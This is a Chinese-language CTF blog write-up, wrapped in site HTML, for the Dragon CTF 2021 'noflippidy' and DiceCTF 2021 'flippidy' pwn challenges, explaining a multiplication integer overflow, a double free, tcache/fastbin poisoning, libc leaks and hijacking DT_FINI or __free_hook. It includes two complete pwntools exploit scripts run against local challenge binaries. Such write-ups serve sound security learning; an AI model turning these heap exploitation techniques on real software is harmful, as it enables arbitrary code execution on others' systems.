@@ -1,0 +1,568 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":230,"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="有趣的整数溢出">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Dragon ctf 2021 | noflippidy">
+<meta property="og:url" content="http://example.com/2021/11/29/Dragon-ctf-noflippidy/index.html">
+<meta property="og:site_name" content="71&#39;s blog">
+<meta property="og:description" content="有趣的整数溢出">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2021/11/29/SuNl3RYVB5jKLsF.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/29/CE8RdTyeYkn9Wpq.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/29/NiLegCK3wn21dtA.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/29/uwSnk8oOXxmB9fK.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/30/zJGkTBNi8vgVwjy.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/30/tif8vYA7VnJ4Iwb.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/30/X7GITFDJCBKPMi8.png">
+<meta property="article:published_time" content="2021-11-29T06:04:12.000Z">
+<meta property="article:modified_time" content="2021-11-30T13:47:33.482Z">
+<meta property="article:author" content="7ee1n">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/11/29/SuNl3RYVB5jKLsF.png">
+
+<link rel="canonical" href="http://example.com/2021/11/29/Dragon-ctf-noflippidy/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Dragon ctf 2021 | noflippidy | 71's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">71's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/29/Dragon-ctf-noflippidy/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="7ee1n">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="71's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Dragon ctf 2021 | noflippidy
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-11-29 14:04:12" itemprop="dateCreated datePublished" datetime="2021-11-29T14:04:12+08:00">2021-11-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-11-30 21:47:33" itemprop="dateModified" datetime="2021-11-30T21:47:33+08:00">2021-11-30</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2021/11/29/Dragon-ctf-noflippidy/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/11/29/Dragon-ctf-noflippidy/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <blockquote>
+<p>有趣的整数溢出</p>
+</blockquote>
+<span id="more"></span>
+
+<h2 id="noflippidy"><a href="#noflippidy" class="headerlink" title="noflippidy"></a>noflippidy</h2><blockquote>
+<p>amd64-64-little，Full RELRO，Canary found，NX enabled， No PIE (0x400000)</p>
+</blockquote>
+<p>程序一开始 malloc 一个指定 size 的 notebook，然后可以选择两个功能：</p>
+<ul>
+<li>add：malloc 0x30，写入 0x30 的数据。ptr 放在 notebook 指定 id 的位置。</li>
+<li>flip：将 notebook 的数据翻转。</li>
+</ul>
+<p>这也是dicectf 2021 的原题 flippidy（后面顺便也复现了这个题）。程序在原基础上打了 patch：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flippidy&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    x = <span class="built_in">bytearray</span>(f.read())</span><br><span class="line"></span><br><span class="line">patch_off = <span class="number">0x138d</span></span><br><span class="line">patch = <span class="string">b&#x27;\x85\xc0\x74\x02\xc9\xc3&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(patch):</span><br><span class="line">    x[patch_off + i] = v</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;noflippidy&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(x)</span><br></pre></td></tr></table></figure>
+
+<p>对应的就是下面这个对 canary 不为 0 的 if 判断，导致 flip 函数无法使用。程序中找不到栈溢出的漏洞，所以这里应该是没办法绕过了。</p>
+<p><img src="https://i.loli.net/2021/11/29/SuNl3RYVB5jKLsF.png"></p>
+<p>输入的函数有整型溢出漏洞。有可能实现堆溢出。现在程序只有 add 功能能使用，也就是只能 malloc 和 edit。因此我们需要尽可能地利用堆溢出打 stdout 才能泄露 libc 地址。</p>
+<p><img src="https://i.loli.net/2021/11/29/CE8RdTyeYkn9Wpq.png"></p>
+<p>但是这里跟常见的整型溢出漏洞不一样。</p>
+<p>假设我们通过 int 转 unsigned int 时的溢出，控制 size 为一个很大的数，比如 -1 转成 0xffffff…., 再乘以 8 之后这个数还是太大，不能 malloc。仔细观察会发现 size 和 id 都是 int，加上原本对 size 的大小就没有限制，所以用负数溢出压根没有利用意义。</p>
+<p>问题出在 malloc 的参数上，它必须在合法范围内。为了能越界写数据，我们希望 8*size 合法，小于 size 的 id 也要足够大，起码得大于 malloc 的大小。换个思路，利用做乘法运算时的溢出，由于 malloc 之前会执行 <code>shl eax,3</code>，我们使乘以 8 后的数字的低 5 字节有值就行。想要往后修改 libc 的值的话，可使用 mmap 分配，这样分配出来的地址就紧挨着 libc了。如图，虽然分配的是 0x200000 的大小，但输入 id 后是跟 0x60040000 的size比较，相当于后面一大段空间任意写了。</p>
+<p><img src="https://i.loli.net/2021/11/29/NiLegCK3wn21dtA.png"></p>
+<p>由于这里是溢出写入一个堆地址，不能直接改 IO FILE 结构体。但是我们可以构造 fastbin 链，chunk写到 fastbin 0x40 的位置，在chunk的 next 指针上写 addr，就能实现一次任意地址申请。跟原题相似的思路。由于程序没开启 PIE、有 stdout 地址、menu 字符串的位置有可写权限，所以通过改 menu 为 stdout 地址来输出 <code>_IO_2_1_stdout</code>地址，泄露 libc 。</p>
+<p><img src="https://i.loli.net/2021/11/29/uwSnk8oOXxmB9fK.png"></p>
+<p>还是只能写堆地址的问题，这里不能直接改 malloc_hook 或者 exit_hook。所以这里改 link_map，找到 <code>l-&gt;l_info[DT_FINI]</code></p>
+<p>的位置，改成 one_gadget，这样执行到 <code>ret &lt;_dl_fini+467&gt; </code> 的时候就返回到 one gadget 了。</p>
+<blockquote>
+<p>参考博客：<a target="_blank" rel="noopener" href="https://kileak.github.io/ctf/2021/dragoncf21-noflippidy/">Dragon CTF 2021 - noflippidy</a></p>
+<p>比赛的时候卡在整数溢出上了，没留意到乘法导致的溢出以及左移三位的操作，测试值一直用的是0x8000000这种低位全0的数据，执行的都是 malloc(0)，分配了0x21的chunk。用 0x8000000的时候id 怎么输都不对，现在调了才发现运算的时候用的是有符号数，这个数是-0，怎么算都会有溢出。</p>
+</blockquote>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&quot;./noflippidy&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./noflippidy&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> s: p.recvuntil(s)</span><br><span class="line">rv = <span class="keyword">lambda</span> s: p.recv(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y : p.sendlineafter(x,y)</span><br><span class="line">sda = <span class="keyword">lambda</span> x,y : p.sendafter(x,y)</span><br><span class="line">sl = <span class="keyword">lambda</span> s: p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s: p.send(s)</span><br><span class="line">it = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">num</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;: &#x27;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params"><span class="built_in">id</span>,con</span>):</span></span><br><span class="line">	menu(<span class="number">1</span>)</span><br><span class="line">	sla(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	sla(<span class="string">&#x27;Content: &#x27;</span>,con)</span><br><span class="line"></span><br><span class="line">stdout_bss=<span class="number">0x404120</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;will be: &#x27;</span>,<span class="built_in">str</span>(<span class="number">0x60040000</span>))</span><br><span class="line">add((<span class="number">0x5ecc50</span>/<span class="number">8</span>),p64(<span class="number">0</span>)+p64(<span class="number">0x41</span>)+p64(<span class="number">0x404000</span>))<span class="comment">#fastbin-&gt;heap-&gt;0x404000</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;padding&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(stdout_bss))</span><br><span class="line">libcbase=u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x3ec760</span></span><br><span class="line">success(<span class="built_in">hex</span>(libcbase))</span><br><span class="line">libc.address=libcbase</span><br><span class="line">one_gadget=[<span class="number">0x4f3d5</span>,<span class="number">0x4f432</span>,<span class="number">0x10a41c</span>]</span><br><span class="line">og=libcbase+one_gadget[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">success(<span class="built_in">hex</span>(og))</span><br><span class="line">add((<span class="number">0x81d208</span>)/<span class="number">8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(og))<span class="comment">#_rtld_global+0x11b8,DT_FINI</span></span><br><span class="line">menu(<span class="number">3</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="flippidy"><a href="#flippidy" class="headerlink" title="flippidy"></a>flippidy</h2><blockquote>
+<p>amd64-64-little，Full RELRO，Canary found，NX enabled，No PIE (0x400000)</p>
+</blockquote>
+<p>用的是没有 tcache double free check 的 2.27 的 libc 版本：（ noflippify 给的是有 check 的 1.4 的小版本）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./libc.so.6</span></span><br><span class="line">GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1) stable release version 2.27.</span><br><span class="line">Copyright (C) 2018 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.</span><br><span class="line">There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A</span><br><span class="line">PARTICULAR PURPOSE.</span><br><span class="line">Compiled by GNU CC version 7.3.0.</span><br><span class="line">libc ABIs: UNIQUE IFUNC</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.</span><br></pre></td></tr></table></figure>
+
+<p>除了 noflippidy 中的整数溢出漏洞外，flip 本身也有 double free 的漏洞。这个函数将 notebook 中的内容头尾倒置，以 size/2 为分界线区分前后的位置。因为整除是向下取整的，所以当 size 为奇数，i 为 size/2 时，这个程序算出来的前和后对称的位置有重合，也就是现在头和尾两个指针指向同一个chunk。这里分别对头尾 free 了一遍，我们可以构造 double free。</p>
+<p><img src="https://i.loli.net/2021/11/30/zJGkTBNi8vgVwjy.png"></p>
+<p>add 的时候往 notebook 里写chunk指针，flip 的时候 double free 的是 chunk。因此只要提前在 chunk 中布置好目标地址， free 的时候就会把目标地址写入 tcache 链中：</p>
+<p><img src="https://i.loli.net/2021/11/30/tif8vYA7VnJ4Iwb.png"></p>
+<p>由于现在只有程序本身的地址可利用，有存储 stdout 地址的变量，menu 数组也是以指针的形式存储的，因此可以把 0x404020 这个位置改成 stdout 泄露 IO FILE 结构体的数据。</p>
+<p>改完之后发现 tcache 头变成了 menu 里字符串的内容，原因是 next 的位置也存储了下一个字符串的指针，后面的地址空间存了字符串的ascii码。为了后续能申请到 free hook，在改 0x404020的位置的时候，也需要把 0x404040的位置改成目标地址。其次，由于输出menu的时候必定会遍历这里的指针，所以也需要把 0x404028后面的指针改合适。这里我改成了跟原来一样的值。</p>
+<p><img src="https://i.loli.net/2021/11/30/X7GITFDJCBKPMi8.png"></p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(argv=[<span class="string">&#x27;./flippidy&#x27;</span>],env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">&#x27;./libc.so.6&#x27;</span>&#125;)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./flippidy&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> s: p.recvuntil(s)</span><br><span class="line">rv = <span class="keyword">lambda</span> s: p.recv(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y : p.sendlineafter(x,y)</span><br><span class="line">sda = <span class="keyword">lambda</span> x,y : p.sendafter(x,y)</span><br><span class="line">sl = <span class="keyword">lambda</span> s: p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s: p.send(s)</span><br><span class="line">it = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">num</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params"><span class="built_in">id</span>,con</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	sla(<span class="string">&#x27;Content: &#x27;</span>,con)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flip</span>():</span></span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">stdout_bss=<span class="number">0x404120</span></span><br><span class="line">menu=<span class="number">0x404020</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;will be: &#x27;</span>,<span class="built_in">str</span>(<span class="number">7</span>))</span><br><span class="line">add(<span class="number">3</span>,p64(menu))</span><br><span class="line">flip()<span class="comment">#tcahce-&gt;0x404020-&gt;0x404040</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,p64(stdout_bss)+ p64(<span class="number">0x404072</span>) + p64(<span class="number">0x4040a4</span>) + p64(<span class="number">0x4040d6</span>) + p64(<span class="number">0x404050</span>))</span><br><span class="line"><span class="comment">#tcache-&gt;0x404040-&gt;0x404050</span></span><br><span class="line">libcbase=u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x3ec760</span></span><br><span class="line">success(<span class="built_in">hex</span>(libcbase))</span><br><span class="line">one_gadget=[<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line">og=libcbase+one_gadget[<span class="number">1</span>]</span><br><span class="line">freehook=libcbase+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">16</span>+p64(freehook))<span class="comment">#tcache-&gt;0x404050-&gt;freehook</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0x404050</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,p64(og))<span class="comment">#freehook</span></span><br><span class="line">flip()</span><br><span class="line">success(<span class="built_in">hex</span>(og))</span><br><span class="line"></span><br><span class="line">it()</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/11/22/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912021/" rel="prev" title="pwn复现 | 西湖论剑2021">
+      <i class="fa fa-chevron-left"></i> pwn复现 | 西湖论剑2021
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#noflippidy"><span class="nav-number">1.</span> <span class="nav-text">noflippidy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flippidy"><span class="nav-number">2.</span> <span class="nav-text">flippidy</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">7ee1n</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://custuvo.github.io/" title="https:&#x2F;&#x2F;custuvo.github.io&#x2F;" rel="noopener" target="_blank">❤Cu3tuv0❤</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://brooke-hub.github.io/" title="https:&#x2F;&#x2F;brooke-hub.github.io&#x2F;" rel="noopener" target="_blank">Wendy</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://r1nd0.github.io/" title="https:&#x2F;&#x2F;r1nd0.github.io&#x2F;" rel="noopener" target="_blank">R1nd0神</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">7ee1n</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
